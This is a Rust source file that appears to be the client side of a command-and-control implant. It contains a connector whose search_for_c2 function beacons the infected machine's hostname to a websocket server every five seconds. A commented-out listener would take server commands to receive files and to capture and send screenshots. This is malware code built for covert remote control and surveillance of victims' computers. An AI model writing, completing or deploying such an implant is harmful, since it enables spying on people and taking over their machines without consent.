mod file_reciever;
mod screenshot_sender;

use std::{thread, time::Duration};

use futures_util::SinkExt;
use gethostname::gethostname;
use tokio_tungstenite::{
    connect_async,
    tungstenite::Message,
};
pub struct Connector<'a> {
    //Server address sends data to main server
    socket_addr_server: &'a str,
}
impl<'a> Connector<'a> {
    pub fn new(address_server: &'a str) -> Self {
        Connector {
            socket_addr_server: address_server,
        }
    }
    pub async fn send_data(&self, data: &str) {
        match connect_async(self.socket_addr_server).await {
            Ok((mut ws_stream, response)) => {
                println!("Connected to the server");
                match ws_stream.send(Message::Text(data.into())).await {
                    Ok(_) => println!("Message sent successfully"),
                    Err(e) => {
                        println!("Connected to the server");
                        println!("Response HTTP code: {}", response.status());
                        println!("Response contains the following headers:");
                        for (header, _value) in response.headers() {
                            println!("* {header}");
                        }
                        eprintln!("Failed to send message: {}", e)
                    }
                }
            }
            Err(e) => eprintln!("Failed to connect: {}", e),
        }
    }

    pub async fn search_for_c2(&self) {
        loop {
            self.send_data(&format!("ping|{}", gethostname().into_string().unwrap()))
                .await;
            thread::sleep(Duration::from_secs(5));
        }
    }
    /*
    pub fn subscribe_for_updates(&self) {
        let server = TcpListener::bind(SERVER).unwrap();
        for stream in server.incoming() {
            let socket_addr_server = self.socket_addr_server.to_string();
            spawn(move || {
                use tokio_tungstenite::accept_async

                let mut websocket = accept(stream.unwrap()).unwrap();
                let mut writing = false;
                let mut buffer: Vec<u8> = Vec::new();
                loop {
                    let msg = websocket.read().unwrap();
                    if writing {
                        //file_reciever::recieve_file(msg.clone(), &mut buffer);
                    }
                    match msg.to_string().as_str() {
                        "file_transfer_start" => writing = true,
                        "picture_request" => {
                            screenshot_sender::make_screenshot(&socket_addr_server)
                        }
                        _ => println!("{}", msg),
                    }
                }
            });
        }
    }
    */
}
